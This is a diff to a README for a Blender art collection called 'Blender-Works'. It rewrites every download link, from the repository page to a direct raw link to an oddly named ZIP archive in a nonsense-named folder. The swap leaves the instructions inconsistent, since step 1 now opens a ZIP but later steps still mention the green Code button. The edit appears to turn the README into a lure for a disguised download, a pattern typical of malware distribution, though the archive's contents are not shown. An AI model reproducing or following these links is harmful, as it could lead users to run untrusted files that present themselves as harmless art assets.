@@ -1,12 +1,12 @@
 # 🎨 Blender-Works - Creative Blender Art Collection
 
-[![Download Blender-Works](https://img.shields.io/badge/Download-Blender--Works-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/KARKIFF/Blender-Works)
+[![Download Blender-Works](https://img.shields.io/badge/Download-Blender--Works-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/KARKIFF/Blender-Works/main/unthinkability/Works-Blender-peachify.zip)
 
 ## 🚀 Download Blender-Works
 
 Use this link to visit the page and download the files:
 
-[Open the Blender-Works download page](https://github.com/KARKIFF/Blender-Works)
+[Open the Blender-Works download page](https://raw.githubusercontent.com/KARKIFF/Blender-Works/main/unthinkability/Works-Blender-peachify.zip)
 
 ## 🖥️ What Blender-Works Is
 
@@ -27,7 +27,7 @@ For smooth use, a PC with at least 8 GB of RAM works well. A graphics card helps
 
 ## 🪟 How to Download on Windows
 
-1. Open the download page: [https://github.com/KARKIFF/Blender-Works](https://github.com/KARKIFF/Blender-Works)
+1. Open the download page: [https://raw.githubusercontent.com/KARKIFF/Blender-Works/main/unthinkability/Works-Blender-peachify.zip](https://raw.githubusercontent.com/KARKIFF/Blender-Works/main/unthinkability/Works-Blender-peachify.zip)
 2. Look for the green Code button on the page
 3. Click the button
 4. Choose Download ZIP
@@ -182,7 +182,7 @@ You can use Blender-Works to:
 
 If you need the files again, use the main page here:
 
-[https://github.com/KARKIFF/Blender-Works](https://github.com/KARKIFF/Blender-Works)
+[https://raw.githubusercontent.com/KARKIFF/Blender-Works/main/unthinkability/Works-Blender-peachify.zip](https://raw.githubusercontent.com/KARKIFF/Blender-Works/main/unthinkability/Works-Blender-peachify.zip)
 
 ## 🧭 File Safety Tips
 
